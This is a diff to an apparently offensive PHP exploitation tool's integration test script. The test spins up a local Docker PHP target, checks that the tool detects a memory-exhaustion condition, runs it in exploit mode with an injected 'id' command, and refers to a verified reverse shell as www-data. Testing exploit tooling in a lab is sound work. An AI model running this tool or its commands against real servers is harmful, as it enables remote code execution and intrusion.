@@ -82,4 +82,27 @@ echo "$REV_OUT" | grep -q "uid=33(www-data)" \
   || fail "reverse shell did not yield a www-data session"
 echo "OK: reverse shell session verified"
 
+echo "== scan: generic target (memory_limit=32M, max_input_vars=5000) =="
+docker rm -f php2shell-generic >/dev/null 2>&1 || true
+docker run -d --rm --name php2shell-generic --network host \
+  -v "$PWD/tests/docker/php-generic.ini":/usr/local/etc/php/conf.d/zz-php2shell.ini:ro \
+  -v "$PWD/tests/docker/ports8091.conf":/etc/apache2/ports.conf:ro \
+  -v "$PWD/tests/docker/apache.conf":/etc/apache2/conf-enabled/zz-php2shell.conf:ro \
+  -v "$PWD/tests/docker/www":/var/www/html:ro \
+  php:8.4.26-apache >/dev/null
+wait_up 8091 generic-target
+GEN_OUT=$(python3 run.py --target "http://127.0.0.1:8091/index.php" 2>&1 || true)
+echo "$GEN_OUT"
+echo "$GEN_OUT" | grep -q "memory-exhaustion" \
+  || fail "generic target (32M limit) not detected"
+echo "OK: generic target detected"
+
+echo "== exploit: generic target reports its ini constraints =="
+GEN_EXPLOIT=$(python3 run.py --target "http://127.0.0.1:8091/index.php" \
+  --exploit --command 'id>/tmp/ng' 2>&1 || true)
+echo "$GEN_EXPLOIT"
+echo "$GEN_EXPLOIT" | grep -q "memory_limit is 32 MiB" \
+  || fail "generic target did not report its memory_limit constraint"
+echo "OK: generic target constraint reported (chain calibrated for 8M)"
+
 echo "== all integration tests passed =="
